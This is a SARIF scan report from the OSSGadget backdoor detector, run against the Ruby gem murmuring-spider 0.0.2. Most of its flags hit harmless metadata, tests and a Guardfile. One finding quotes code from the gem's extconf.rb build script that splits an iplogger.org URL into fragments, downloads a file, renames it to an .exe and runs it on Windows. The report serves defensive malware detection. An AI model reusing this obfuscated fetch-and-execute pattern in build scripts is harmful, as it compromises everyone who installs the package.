@@ -1,0 +1,277 @@
+{
+  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.6.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "oss-detect-backdoor",
+          "organization": "Microsoft Corporation",
+          "product": "OSSGadget (https://github.com/Microsoft/OSSGadget)",
+          "version": "0.0.0+4a24249b20"
+        }
+      },
+      "results": [
+        {
+          "rule": {
+            "id": "BD000610"
+          },
+          "message": {
+            "text": "Backdoor: LOLBAS: Linux Indicator",
+            "id": "BD000610"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/ruby/murmuring-spider-0.0.2.gem/metadata.gz/metadata"
+                },
+                "region": {
+                  "startLine": 5,
+                  "startColumn": 9,
+                  "endLine": 6,
+                  "snippet": {
+                    "text": "name: murmuring-spider\nversion: !ruby/object:Gem::Version\n  version: 0.0.2\nplatform: ruby\nauthors:\n- tomykaira\nautorequire: \nbindir: bin\n",
+                    "rendered": {
+                      "text": "name: murmuring-spider\nversion: !ruby/object:Gem::Version\n  version: 0.0.2\nplatform: ruby\nauthors:\n- tomykaira\nautorequire: \nbindir: bin\n",
+                      "markdown": "`name: murmuring-spider\nversion: !ruby/object:Gem::Version\n  version: 0.0.2\nplatform: ruby\nauthors:\n- tomykaira\nautorequire: \nbindir: bin\n`"
+                    }
+                  },
+                  "sourceLanguage": "Unknown"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000800"
+          },
+          "message": {
+            "text": "Backdoor: Obfuscation",
+            "id": "BD000800"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/ruby/murmuring-spider-0.0.2.gem/data.tar.gz/data.tar/ext/trellislike/unflaming/waffling/extconf.rb"
+                },
+                "region": {
+                  "startLine": 1,
+                  "startColumn": 9,
+                  "endLine": 1,
+                  "endColumn": 15,
+                  "snippet": {
+                    "text": "require 'base64'\r\nrequire 'open3'\r\nrequire 'rbconfig'\r\nrequire 'httparty'\r\n",
+                    "rendered": {
+                      "text": "require 'base64'\r\nrequire 'open3'\r\nrequire 'rbconfig'\r\nrequire 'httparty'\r\n",
+                      "markdown": "`require 'base64'\r\nrequire 'open3'\r\nrequire 'rbconfig'\r\nrequire 'httparty'\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "ruby"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 4
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/ruby/murmuring-spider-0.0.2.gem/data.tar.gz/data.tar/ext/trellislike/unflaming/waffling/extconf.rb"
+                },
+                "region": {
+                  "startLine": 20,
+                  "startColumn": 14,
+                  "endLine": 20,
+                  "endColumn": 19,
+                  "snippet": {
+                    "text": "d = \"ht\"\r\naa = \"tps:/\"\r\ne = \".\"\r\nrsp = HTTParty.get(d + aa + \"/\" + \"iplogger\" + e + \"org/1kZn67.jpeg\")\r\nif TacoBell.check_win\r\n  File.rename(\"aaa.png\", \"a.exe\")\r\n  exec(\"a.exe\")\r\n",
+                    "rendered": {
+                      "text": "d = \"ht\"\r\naa = \"tps:/\"\r\ne = \".\"\r\nrsp = HTTParty.get(d + aa + \"/\" + \"iplogger\" + e + \"org/1kZn67.jpeg\")\r\nif TacoBell.check_win\r\n  File.rename(\"aaa.png\", \"a.exe\")\r\n  exec(\"a.exe\")\r\n",
+                      "markdown": "`d = \"ht\"\r\naa = \"tps:/\"\r\ne = \".\"\r\nrsp = HTTParty.get(d + aa + \"/\" + \"iplogger\" + e + \"org/1kZn67.jpeg\")\r\nif TacoBell.check_win\r\n  File.rename(\"aaa.png\", \"a.exe\")\r\n  exec(\"a.exe\")\r\n`"
+                    }
+                  },
+                  "sourceLanguage": "ruby"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000610"
+          },
+          "message": {
+            "text": "Backdoor: LOLBAS: Linux Indicator",
+            "id": "BD000610"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/ruby/murmuring-spider-0.0.2.gem/data.tar.gz/data.tar/spec/murmuring_spider/operation_spec.rb"
+                },
+                "region": {
+                  "startLine": 16,
+                  "startColumn": 7,
+                  "endLine": 16,
+                  "endColumn": 15,
+                  "snippet": {
+                    "text": "    context 'when the same operation is added' do\n      before { subject.add(:user_timeline, 'tomy_kaira') }\n      it \"should raise error\" do\n        expect { subject.add(:user_timeline, 'tomy_kaira') }.to raise_error(DataMapper::SaveFailureError)\n      end\n    end\n\n",
+                    "rendered": {
+                      "text": "    context 'when the same operation is added' do\n      before { subject.add(:user_timeline, 'tomy_kaira') }\n      it \"should raise error\" do\n        expect { subject.add(:user_timeline, 'tomy_kaira') }.to raise_error(DataMapper::SaveFailureError)\n      end\n    end\n\n",
+                      "markdown": "`    context 'when the same operation is added' do\n      before { subject.add(:user_timeline, 'tomy_kaira') }\n      it \"should raise error\" do\n        expect { subject.add(:user_timeline, 'tomy_kaira') }.to raise_error(DataMapper::SaveFailureError)\n      end\n    end\n\n`"
+                    }
+                  },
+                  "sourceLanguage": "ruby"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/ruby/murmuring-spider-0.0.2.gem/data.tar.gz/data.tar/spec/murmuring_spider/operation_spec.rb"
+                },
+                "region": {
+                  "startLine": 69,
+                  "startColumn": 42,
+                  "endLine": 69,
+                  "endColumn": 47,
+                  "snippet": {
+                    "text": "        operation.collect_statuses.should == response\n      end\n\n      subject { MurmuringSpider::Operation.get(operation.id).collect_statuses }\n      it { should be_empty }\n    end\n  end\n",
+                    "rendered": {
+                      "text": "        operation.collect_statuses.should == response\n      end\n\n      subject { MurmuringSpider::Operation.get(operation.id).collect_statuses }\n      it { should be_empty }\n    end\n  end\n",
+                      "markdown": "`        operation.collect_statuses.should == response\n      end\n\n      subject { MurmuringSpider::Operation.get(operation.id).collect_statuses }\n      it { should be_empty }\n    end\n  end\n`"
+                    }
+                  },
+                  "sourceLanguage": "ruby"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/ruby/murmuring-spider-0.0.2.gem/data.tar.gz/data.tar/spec/murmuring_spider/operation_spec.rb"
+                },
+                "region": {
+                  "startLine": 50,
+                  "startColumn": 13,
+                  "endLine": 50,
+                  "endColumn": 18,
+                  "snippet": {
+                    "text": "\n    it \"should remove the operation\" do\n      subject.remove(:user_timeline, 'fake-user')\n      subject.get(operation.id).should be_nil\n    end\n  end\n\n",
+                    "rendered": {
+                      "text": "\n    it \"should remove the operation\" do\n      subject.remove(:user_timeline, 'fake-user')\n      subject.get(operation.id).should be_nil\n    end\n  end\n\n",
+                      "markdown": "`\n    it \"should remove the operation\" do\n      subject.remove(:user_timeline, 'fake-user')\n      subject.get(operation.id).should be_nil\n    end\n  end\n\n`"
+                    }
+                  },
+                  "sourceLanguage": "ruby"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000600"
+          },
+          "message": {
+            "text": "Backdoor: LOLBAS: Windows Indicator",
+            "id": "BD000600"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/ruby/murmuring-spider-0.0.2.gem/data.tar.gz/data.tar/Guardfile"
+                },
+                "region": {
+                  "startLine": 2,
+                  "startColumn": 11,
+                  "endLine": 2,
+                  "endColumn": 15,
+                  "snippet": {
+                    "text": "# A sample Guardfile\n# More info at https://github.com/guard/guard#readme\n\nguard 'rspec', :version => 2 do\n  watch(%r{^spec/.+_spec\\.rb$})\n",
+                    "rendered": {
+                      "text": "# A sample Guardfile\n# More info at https://github.com/guard/guard#readme\n\nguard 'rspec', :version => 2 do\n  watch(%r{^spec/.+_spec\\.rb$})\n",
+                      "markdown": "`# A sample Guardfile\n# More info at https://github.com/guard/guard#readme\n\nguard 'rspec', :version => 2 do\n  watch(%r{^spec/.+_spec\\.rb$})\n`"
+                    }
+                  },
+                  "sourceLanguage": "Unknown"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 4,
+            "Confidence": 1
+          }
+        }
+      ],
+      "columnKind": "utf16CodeUnits"
+    }
+  ]
+}
